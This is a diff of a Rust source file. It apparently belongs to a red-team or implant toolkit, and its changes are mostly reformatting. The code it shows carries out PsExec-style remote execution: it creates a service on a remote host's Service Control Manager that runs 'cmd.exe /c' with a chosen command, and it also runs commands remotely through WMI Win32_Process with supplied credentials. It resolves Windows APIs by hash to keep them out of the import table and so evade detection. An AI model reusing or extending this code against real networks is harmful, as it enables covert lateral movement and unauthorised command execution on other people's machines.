@@ -44,10 +44,16 @@ unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) 
         Some(m) => m,
         None => {
             let load_library_w: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
-                resolve_api(pe_resolve::HASH_KERNEL32_DLL, pe_resolve::hash_str(b"LoadLibraryW\0"))?;
+                resolve_api(
+                    pe_resolve::HASH_KERNEL32_DLL,
+                    pe_resolve::hash_str(b"LoadLibraryW\0"),
+                )?;
             let m = load_library_w(dll_wide.as_ptr());
             if m.is_null() {
-                return Err(anyhow!("LoadLibraryW failed for DLL (hash 0x{:08X})", dll_hash));
+                return Err(anyhow!(
+                    "LoadLibraryW failed for DLL (hash 0x{:08X})",
+                    dll_hash
+                ));
             }
             m as usize
         }
@@ -60,16 +66,32 @@ unsafe fn resolve_api_or_load<T>(dll_wide: &[u16], dll_hash: u32, fn_hash: u32) 
 use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
 // DLL wide names and hashes (not in pe_resolve build.rs).
-const OLE32_DLL_NAME_W: &[u16] = &['o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
-const OLE32_DLL_W: &[u16] = &['o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+const OLE32_DLL_NAME_W: &[u16] = &[
+    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16,
+    'l' as u16,
+];
+const OLE32_DLL_W: &[u16] = &[
+    'o' as u16, 'l' as u16, 'e' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16,
+    'l' as u16, 0,
+];
 const HASH_OLE32_DLL: u32 = hash_wstr_const(OLE32_DLL_NAME_W);
 
-const ADVAPI32_DLL_NAME_W: &[u16] = &['a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
-const ADVAPI32_DLL_W: &[u16] = &['a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+const ADVAPI32_DLL_NAME_W: &[u16] = &[
+    'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16,
+];
+const ADVAPI32_DLL_W: &[u16] = &[
+    'a' as u16, 'd' as u16, 'v' as u16, 'a' as u16, 'p' as u16, 'i' as u16, '3' as u16, '2' as u16,
+    '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+];
 const HASH_ADVAPI32_DLL: u32 = hash_wstr_const(ADVAPI32_DLL_NAME_W);
 
-const MPR_DLL_NAME_W: &[u16] = &['m' as u16, 'p' as u16, 'r' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16];
-const MPR_DLL_W: &[u16] = &['m' as u16, 'p' as u16, 'r' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0];
+const MPR_DLL_NAME_W: &[u16] = &[
+    'm' as u16, 'p' as u16, 'r' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16,
+];
+const MPR_DLL_W: &[u16] = &[
+    'm' as u16, 'p' as u16, 'r' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0,
+];
 const HASH_MPR_DLL: u32 = hash_wstr_const(MPR_DLL_NAME_W);
 
 // API name hashes.
@@ -82,53 +104,72 @@ const HASH_WNETADDCONNECTION2W: u32 = hash_str_const(b"WNetAddConnection2W\0");
 const HASH_WNETCANCELCONNECTION2W: u32 = hash_str_const(b"WNetCancelConnection2W\0");
 
 // ── API hash constants (advapi32 — SCM functions) ───────────────────────────
-const HASH_OPENSCMANAGERW: u32  = hash_str_const(b"OpenSCManagerW\0");
-const HASH_CREATESERVICEW: u32  = hash_str_const(b"CreateServiceW\0");
-const HASH_STARTSERVICEW: u32   = hash_str_const(b"StartServiceW\0");
-const HASH_DELETESERVICE: u32   = hash_str_const(b"DeleteService\0");
+const HASH_OPENSCMANAGERW: u32 = hash_str_const(b"OpenSCManagerW\0");
+const HASH_CREATESERVICEW: u32 = hash_str_const(b"CreateServiceW\0");
+const HASH_STARTSERVICEW: u32 = hash_str_const(b"StartServiceW\0");
+const HASH_DELETESERVICE: u32 = hash_str_const(b"DeleteService\0");
 const HASH_CLOSESERVICEHANDLE: u32 = hash_str_const(b"CloseServiceHandle\0");
-const HASH_OPENSERVICEW: u32    = hash_str_const(b"OpenServiceW\0");
+const HASH_OPENSERVICEW: u32 = hash_str_const(b"OpenServiceW\0");
 const HASH_QUERYSERVICESTATUS: u32 = hash_str_const(b"QueryServiceStatus\0");
 
 // Function pointer types.
 type FnCoInitializeEx = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> i32;
 type FnCoUninitialize = unsafe extern "system" fn();
 type FnCoInitializeSecurity = unsafe extern "system" fn(
-    *mut std::ffi::c_void, i32, *mut std::ffi::c_void, *mut std::ffi::c_void,
-    u32, u32, *mut std::ffi::c_void, u32, *mut std::ffi::c_void,
+    *mut std::ffi::c_void,
+    i32,
+    *mut std::ffi::c_void,
+    *mut std::ffi::c_void,
+    u32,
+    u32,
+    *mut std::ffi::c_void,
+    u32,
+    *mut std::ffi::c_void,
 ) -> i32;
 type FnCoSetProxyBlanket = unsafe extern "system" fn(
-    *mut winapi::um::unknwnbase::IUnknown, u32, u32, *mut u16, u32, u32,
-    *mut winapi::shared::wtypesbase::COAUTHIDENTITY, u32,
+    *mut winapi::um::unknwnbase::IUnknown,
+    u32,
+    u32,
+    *mut u16,
+    u32,
+    u32,
+    *mut winapi::shared::wtypesbase::COAUTHIDENTITY,
+    u32,
 ) -> i32;
 type FnGetLastError = unsafe extern "system" fn() -> u32;
 type FnWNetAddConnection2W = unsafe extern "system" fn(
-    *mut winapi::um::winnetwk::NETRESOURCEW, *const u16, *const u16, u32,
+    *mut winapi::um::winnetwk::NETRESOURCEW,
+    *const u16,
+    *const u16,
+    u32,
 ) -> i32;
 type FnWNetCancelConnection2W = unsafe extern "system" fn(*const u16, u32, i32) -> i32;
 
 // ── Function pointer types (advapi32 — SCM) ────────────────────────────────
-type FnOpenSCManagerW = unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut std::ffi::c_void;
+type FnOpenSCManagerW =
+    unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut std::ffi::c_void;
 type FnCreateServiceW = unsafe extern "system" fn(
-    *mut std::ffi::c_void,      // hSCManager
-    *const u16,                 // lpServiceName
-    *const u16,                 // lpDisplayName
-    u32,                        // dwDesiredAccess
-    u32,                        // dwServiceType
-    u32,                        // dwStartType
-    u32,                        // dwErrorControl
-    *const u16,                 // lpBinaryPathName
-    *const u16,                 // lpLoadOrderGroup
-    *mut u32,                   // lpdwTagId
-    *const u16,                 // lpDependencies
-    *const u16,                 // lpServiceStartName
-    *const u16,                 // lpPassword
+    *mut std::ffi::c_void, // hSCManager
+    *const u16,            // lpServiceName
+    *const u16,            // lpDisplayName
+    u32,                   // dwDesiredAccess
+    u32,                   // dwServiceType
+    u32,                   // dwStartType
+    u32,                   // dwErrorControl
+    *const u16,            // lpBinaryPathName
+    *const u16,            // lpLoadOrderGroup
+    *mut u32,              // lpdwTagId
+    *const u16,            // lpDependencies
+    *const u16,            // lpServiceStartName
+    *const u16,            // lpPassword
 ) -> *mut std::ffi::c_void;
 type FnStartServiceW = unsafe extern "system" fn(*mut std::ffi::c_void, u32, *const u16) -> i32;
 type FnDeleteService = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
 type FnCloseServiceHandle = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
-type FnOpenServiceW = unsafe extern "system" fn(*mut std::ffi::c_void, *const u16, u32) -> *mut std::ffi::c_void;
-type FnQueryServiceStatus = unsafe extern "system" fn(*mut std::ffi::c_void, *mut ServiceStatus) -> i32;
+type FnOpenServiceW =
+    unsafe extern "system" fn(*mut std::ffi::c_void, *const u16, u32) -> *mut std::ffi::c_void;
+type FnQueryServiceStatus =
+    unsafe extern "system" fn(*mut std::ffi::c_void, *mut ServiceStatus) -> i32;
 
 // ── SCM constants (replacing IAT-producing winsvc imports) ──────────────────
 const SERVICE_ALL_ACCESS: u32 = 0x000F01FF;
@@ -163,7 +204,10 @@ const IID_NULL: winapi::shared::guiddef::GUID = winapi::shared::guiddef::GUID {
 
 /// Convert a Rust string to a Windows wide (UTF-16) string with null terminator.
 fn wide(s: &str) -> Vec<u16> {
-    OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
+    OsStr::new(s)
+        .encode_wide()
+        .chain(std::iter::once(0))
+        .collect()
 }
 
 /// RAII guard for COM initialization.
@@ -259,9 +303,17 @@ pub fn psexec_exec(
             .expect("QueryServiceStatus resolution failed")
     };
 
-    let service_name = format!("{}_{}", common::ioc::IOC_SERVICE_PREFIX, crate::common_short_id());
+    let service_name = format!(
+        "{}_{}",
+        common::ioc::IOC_SERVICE_PREFIX,
+        crate::common_short_id()
+    );
     let display_name = service_name.clone();
-    let output_path = format!(r"C:\__{}_{}.txt", common::ioc::IOC_SERVICE_PREFIX, crate::common_short_id());
+    let output_path = format!(
+        r"C:\__{}_{}.txt",
+        common::ioc::IOC_SERVICE_PREFIX,
+        crate::common_short_id()
+    );
     let bin_path = format!("cmd.exe /c {} > \"{}\" 2>&1", command, output_path);
 
     let scm_path = sc_path(target_host);
@@ -283,15 +335,13 @@ pub fn psexec_exec(
     };
 
     // Open remote SCM.
-    let scm = unsafe {
-        fn_open_scm(
-            scm_path.as_ptr(),
-            ptr::null_mut(),
-            SERVICE_ALL_ACCESS,
-        )
-    };
+    let scm = unsafe { fn_open_scm(scm_path.as_ptr(), ptr::null_mut(), SERVICE_ALL_ACCESS) };
     if scm.is_null() {
-        return Err(anyhow!("OpenSCManagerW failed for host '{}': error {}", target_host, unsafe { get_last_error() }));
+        return Err(anyhow!(
+            "OpenSCManagerW failed for host '{}': error {}",
+            target_host,
+            unsafe { get_last_error() }
+        ));
     }
 
     // Create the service.
@@ -369,8 +419,8 @@ pub fn psexec_exec(
 // API-hashing resolver at runtime.
 
 use winapi::shared::guiddef::{GUID, REFIID};
-use winapi::shared::wtypes::BSTR;
 use winapi::shared::winerror::{HRESULT, SUCCEEDED};
+use winapi::shared::wtypes::BSTR;
 use winapi::shared::wtypesbase::CLSCTX_INPROC_SERVER;
 use winapi::um::oaidl::VARIANT;
 use winapi::um::unknwnbase::IUnknown;
@@ -381,12 +431,25 @@ type LONG = winapi::um::winnt::LONG;
 
 #[repr(C)]
 struct IWbemClassObjectVtbl {
-    pub query_interface:   unsafe extern "system" fn(*mut IWbemClassObject, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub add_ref:           unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
-    pub release:           unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
-    pub get_qualifier_set: unsafe extern "system" fn(*mut IWbemClassObject, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub get:               unsafe extern "system" fn(*mut IWbemClassObject, BSTR, LONG, *mut VARIANT, *mut LONG, *mut LONG) -> HRESULT,
-    pub put:               unsafe extern "system" fn(*mut IWbemClassObject, BSTR, LONG, *mut VARIANT, LONG) -> HRESULT,
+    pub query_interface: unsafe extern "system" fn(
+        *mut IWbemClassObject,
+        REFIID,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub add_ref: unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
+    pub release: unsafe extern "system" fn(*mut IWbemClassObject) -> u32,
+    pub get_qualifier_set:
+        unsafe extern "system" fn(*mut IWbemClassObject, *mut *mut std::ffi::c_void) -> HRESULT,
+    pub get: unsafe extern "system" fn(
+        *mut IWbemClassObject,
+        BSTR,
+        LONG,
+        *mut VARIANT,
+        *mut LONG,
+        *mut LONG,
+    ) -> HRESULT,
+    pub put:
+        unsafe extern "system" fn(*mut IWbemClassObject, BSTR, LONG, *mut VARIANT, LONG) -> HRESULT,
 }
 #[repr(C)]
 struct IWbemClassObject {
@@ -399,33 +462,176 @@ struct IWbemClassObject {
 #[repr(C)]
 struct IWbemServicesVtbl {
     // IUnknown (0-2)
-    pub query_interface:    unsafe extern "system" fn(*mut IWbemServices, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub add_ref:            unsafe extern "system" fn(*mut IWbemServices) -> u32,
-    pub release:            unsafe extern "system" fn(*mut IWbemServices) -> u32,
+    pub query_interface: unsafe extern "system" fn(
+        *mut IWbemServices,
+        REFIID,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub add_ref: unsafe extern "system" fn(*mut IWbemServices) -> u32,
+    pub release: unsafe extern "system" fn(*mut IWbemServices) -> u32,
     // IWbemServices (3+)
-    pub open_namespace:     unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut IWbemServices, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub cancel_async_call:  unsafe extern "system" fn(*mut IWbemServices, *mut std::ffi::c_void) -> HRESULT,
-    pub query_object_sink:  unsafe extern "system" fn(*mut IWbemServices, LONG, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub get_object:         unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut IWbemClassObject, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub get_object_async:   unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-    pub put_class:          unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub put_class_async:    unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-    pub delete_class:       unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub delete_class_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-    pub create_class_enum:  unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub create_class_enum_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-    pub put_instance:       unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub put_instance_async: unsafe extern "system" fn(*mut IWbemServices, *mut IWbemClassObject, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-    pub delete_instance:    unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub delete_instance_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-    pub create_instance_enum: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub create_instance_enum_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, LONG, *mut IUnknown, *mut std::ffi::c_void) -> HRESULT,
-    pub exec_query:         unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub exec_query_async:   unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut std::ffi::c_void) -> HRESULT,
-    pub exec_notification_query: unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub exec_notification_query_async: unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut std::ffi::c_void) -> HRESULT,
-    pub exec_method:        unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut IWbemClassObject, *mut *mut IWbemClassObject, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub exec_method_async:  unsafe extern "system" fn(*mut IWbemServices, BSTR, BSTR, LONG, *mut std::ffi::c_void, *mut IWbemClassObject, *mut std::ffi::c_void) -> HRESULT,
+    pub open_namespace: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        LONG,
+        *mut IUnknown,
+        *mut *mut IWbemServices,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub cancel_async_call:
+        unsafe extern "system" fn(*mut IWbemServices, *mut std::ffi::c_void) -> HRESULT,
+    pub query_object_sink:
+        unsafe extern "system" fn(*mut IWbemServices, LONG, *mut *mut std::ffi::c_void) -> HRESULT,
+    pub get_object: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        LONG,
+        *mut IUnknown,
+        *mut *mut IWbemClassObject,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub get_object_async: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        LONG,
+        *mut IUnknown,
+        *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub put_class: unsafe extern "system" fn(
+        *mut IWbemServices,
+        *mut IWbemClassObject,
+        LONG,
+        *mut IUnknown,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub put_class_async: unsafe extern "system" fn(
+        *mut IWbemServices,
+        *mut IWbemClassObject,
+        LONG,
+        *mut IUnknown,
+        *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub delete_class: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        LONG,
+        *mut IUnknown,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub delete_class_async: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        LONG,
+        *mut IUnknown,
+        *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub create_class_enum: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        LONG,
+        *mut IUnknown,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub create_class_enum_async: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        LONG,
+        *mut IUnknown,
+        *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub put_instance: unsafe extern "system" fn(
+        *mut IWbemServices,
+        *mut IWbemClassObject,
+        LONG,
+        *mut IUnknown,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub put_instance_async: unsafe extern "system" fn(
+        *mut IWbemServices,
+        *mut IWbemClassObject,
+        LONG,
+        *mut IUnknown,
+        *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub delete_instance: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        LONG,
+        *mut IUnknown,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub delete_instance_async: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        LONG,
+        *mut IUnknown,
+        *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub create_instance_enum: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        LONG,
+        *mut IUnknown,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub create_instance_enum_async: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        LONG,
+        *mut IUnknown,
+        *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub exec_query: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        BSTR,
+        LONG,
+        *mut std::ffi::c_void,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub exec_query_async: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        BSTR,
+        LONG,
+        *mut std::ffi::c_void,
+        *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub exec_notification_query: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        BSTR,
+        LONG,
+        *mut std::ffi::c_void,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub exec_notification_query_async: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        BSTR,
+        LONG,
+        *mut std::ffi::c_void,
+        *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub exec_method: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        BSTR,
+        LONG,
+        *mut std::ffi::c_void,
+        *mut IWbemClassObject,
+        *mut *mut IWbemClassObject,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub exec_method_async: unsafe extern "system" fn(
+        *mut IWbemServices,
+        BSTR,
+        BSTR,
+        LONG,
+        *mut std::ffi::c_void,
+        *mut IWbemClassObject,
+        *mut std::ffi::c_void,
+    ) -> HRESULT,
 }
 #[repr(C)]
 struct IWbemServices {
@@ -434,12 +640,18 @@ struct IWbemServices {
 
 #[repr(C)]
 struct IWbemLocatorVtbl {
-    pub query_interface: unsafe extern "system" fn(*mut IWbemLocator, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub add_ref:         unsafe extern "system" fn(*mut IWbemLocator) -> u32,
-    pub release:         unsafe extern "system" fn(*mut IWbemLocator) -> u32,
-    pub connect_server:  unsafe extern "system" fn(
+    pub query_interface:
+        unsafe extern "system" fn(*mut IWbemLocator, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
+    pub add_ref: unsafe extern "system" fn(*mut IWbemLocator) -> u32,
+    pub release: unsafe extern "system" fn(*mut IWbemLocator) -> u32,
+    pub connect_server: unsafe extern "system" fn(
         *mut IWbemLocator,
-        BSTR, BSTR, BSTR, BSTR, LONG, BSTR,
+        BSTR,
+        BSTR,
+        BSTR,
+        BSTR,
+        LONG,
+        BSTR,
         *mut std::ffi::c_void,
         *mut *mut IWbemServices,
     ) -> HRESULT,
@@ -452,14 +664,28 @@ struct IWbemLocator {
 // IEnumWbemClassObject — used to walk ExecQuery results.
 #[repr(C)]
 struct IEnumWbemClassObjectVtbl {
-    pub query_interface: unsafe extern "system" fn(*mut IEnumWbemClassObject, REFIID, *mut *mut std::ffi::c_void) -> HRESULT,
-    pub add_ref:         unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
-    pub release:         unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
-    pub reset:           unsafe extern "system" fn(*mut IEnumWbemClassObject) -> HRESULT,
-    pub next:            unsafe extern "system" fn(*mut IEnumWbemClassObject, LONG, u32, *mut *mut IWbemClassObject, *mut u32) -> HRESULT,
-    pub next_async:      unsafe extern "system" fn(*mut IEnumWbemClassObject, u32, *mut std::ffi::c_void) -> HRESULT,
-    pub clone:           unsafe extern "system" fn(*mut IEnumWbemClassObject, *mut *mut IEnumWbemClassObject) -> HRESULT,
-    pub skip:            unsafe extern "system" fn(*mut IEnumWbemClassObject, LONG, u32) -> HRESULT,
+    pub query_interface: unsafe extern "system" fn(
+        *mut IEnumWbemClassObject,
+        REFIID,
+        *mut *mut std::ffi::c_void,
+    ) -> HRESULT,
+    pub add_ref: unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
+    pub release: unsafe extern "system" fn(*mut IEnumWbemClassObject) -> u32,
+    pub reset: unsafe extern "system" fn(*mut IEnumWbemClassObject) -> HRESULT,
+    pub next: unsafe extern "system" fn(
+        *mut IEnumWbemClassObject,
+        LONG,
+        u32,
+        *mut *mut IWbemClassObject,
+        *mut u32,
+    ) -> HRESULT,
+    pub next_async:
+        unsafe extern "system" fn(*mut IEnumWbemClassObject, u32, *mut std::ffi::c_void) -> HRESULT,
+    pub clone: unsafe extern "system" fn(
+        *mut IEnumWbemClassObject,
+        *mut *mut IEnumWbemClassObject,
+    ) -> HRESULT,
+    pub skip: unsafe extern "system" fn(*mut IEnumWbemClassObject, LONG, u32) -> HRESULT,
 }
 #[repr(C)]
 struct IEnumWbemClassObject {
@@ -497,7 +723,8 @@ unsafe fn wmi_alloc_bstr(s: &str) -> BSTR {
     let fn_addr = pe_resolve::get_proc_address_by_hash(
         oleaut32,
         pe_resolve::hash_str(b"SysAllocStringLen\0"),
-    ).expect("SysAllocStringLen not found in oleaut32");
+    )
+    .expect("SysAllocStringLen not found in oleaut32");
     let sys_alloc_string_len: unsafe extern "system" fn(*const u16, u32) -> BSTR =
         std::mem::transmute(fn_addr);
     sys_alloc_string_len(wide.as_ptr(), wide.len() as u32)
@@ -506,14 +733,15 @@ unsafe fn wmi_alloc_bstr(s: &str) -> BSTR {
 /// Free a BSTR previously allocated by [`wmi_alloc_bstr`].  Null-safe.
 unsafe fn wmi_free_bstr(b: BSTR) {
     if !b.is_null() {
-        let oleaut32 = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"oleaut32.dll\0"))
-            .expect("oleaut32.dll not found in PEB");
+        let oleaut32 =
+            pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"oleaut32.dll\0"))
+                .expect("oleaut32.dll not found in PEB");
         let fn_addr = pe_resolve::get_proc_address_by_hash(
             oleaut32,
             pe_resolve::hash_str(b"SysFreeString\0"),
-        ).expect("SysFreeString not found in oleaut32");
-        let sys_free_string: unsafe extern "system" fn(BSTR) =
-            std::mem::transmute(fn_addr);
+        )
+        .expect("SysFreeString not found in oleaut32");
+        let sys_free_string: unsafe extern "system" fn(BSTR) = std::mem::transmute(fn_addr);
         sys_free_string(b);
     }
 }
@@ -535,7 +763,14 @@ unsafe fn wmi_put_bstr_prop(obj: *mut IWbemClassObject, name: &str, value: &str)
 unsafe fn wmi_get_i4_prop(obj: *mut IWbemClassObject, name: &str) -> Option<i32> {
     let name_bstr = wmi_alloc_bstr(name);
     let mut var: VARIANT = std::mem::zeroed();
-    let hr = ((*(*obj).lpvtbl).get)(obj, name_bstr, 0, &mut var, ptr::null_mut(), ptr::null_mut());
+    let hr = ((*(*obj).lpvtbl).get)(
+        obj,
+        name_bstr,
+        0,
+        &mut var,
+        ptr::null_mut(),
+        ptr::null_mut(),
+    );
     wmi_free_bstr(name_bstr);
     if !SUCCEEDED(hr) {
         return None;
@@ -563,14 +798,19 @@ pub fn wmi_exec(
     password: Option<&str>,
 ) -> Result<String> {
     // Resolve CoCreateInstance via pe_resolve (avoid IAT entry for ole32).
-    let ole32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ole32.dll\0")) }
-        .context("ole32.dll not found in PEB")?;
-    let co_create_instance_addr = unsafe { pe_resolve::get_proc_address_by_hash(
-        ole32,
-        pe_resolve::hash_str(b"CoCreateInstance\0"),
-    ) }.context("CoCreateInstance not found in ole32")?;
+    let ole32 =
+        unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ole32.dll\0")) }
+            .context("ole32.dll not found in PEB")?;
+    let co_create_instance_addr = unsafe {
+        pe_resolve::get_proc_address_by_hash(ole32, pe_resolve::hash_str(b"CoCreateInstance\0"))
+    }
+    .context("CoCreateInstance not found in ole32")?;
     let co_create_instance: unsafe extern "system" fn(
-        REFIID, *mut IUnknown, u32, REFIID, *mut *mut std::ffi::c_void,
+        REFIID,
+        *mut IUnknown,
+        u32,
+        REFIID,
+        *mut *mut std::ffi::c_void,
     ) -> HRESULT = unsafe { std::mem::transmute(co_create_instance_addr) };
 
     let _com = ComGuard::new();
@@ -587,7 +827,10 @@ pub fn wmi_exec(
         )
     };
     if !SUCCEEDED(hr) {
-        return Err(anyhow!("CoCreateInstance(WbemLocator) failed: 0x{:08X}", hr as u32));
+        return Err(anyhow!(
+            "CoCreateInstance(WbemLocator) failed: 0x{:08X}",
+            hr as u32
+        ));
     }
 
     // ── Step 2: ConnectServer to the remote WMI namespace ───────────────
@@ -611,12 +854,22 @@ pub fn wmi_exec(
     };
     unsafe {
         wmi_free_bstr(ns_bstr);
-        if let Some(b) = user_bstr { wmi_free_bstr(b); }
-        if let Some(b) = pass_bstr { wmi_free_bstr(b); }
+        if let Some(b) = user_bstr {
+            wmi_free_bstr(b);
+        }
+        if let Some(b) = pass_bstr {
+            wmi_free_bstr(b);
+        }
     }
     if !SUCCEEDED(hr) {
-        unsafe { ((*(*locator_ptr).lpvtbl).release)(locator_ptr); }
-        return Err(anyhow!("IWbemLocator::ConnectServer to {} failed: 0x{:08X}", target_host, hr as u32));
+        unsafe {
+            ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
+        }
+        return Err(anyhow!(
+            "IWbemLocator::ConnectServer to {} failed: 0x{:08X}",
+            target_host,
+            hr as u32
+        ));
     }
 
     // ── Step 3: Set proxy blanket for authentication ────────────────────
@@ -657,13 +910,18 @@ pub fn wmi_exec(
             ptr::null_mut(),
         )
     };
-    unsafe { wmi_free_bstr(class_bstr); }
+    unsafe {
+        wmi_free_bstr(class_bstr);
+    }
     if !SUCCEEDED(hr) {
         unsafe {
             ((*(*services_ptr).lpvtbl).release)(services_ptr);
             ((*(*locator_ptr).lpvtbl).release)(locator_ptr);
         }
-        return Err(anyhow!("GetObject(Win32_Process) failed: 0x{:08X}", hr as u32));
+        return Err(anyhow!(
+            "GetObject(Win32_Process) failed: 0x{:08X}",
+            hr as u32
+        ));
     }
 
     // ── Step 5: SpawnInstance to create the input parameters object ─────
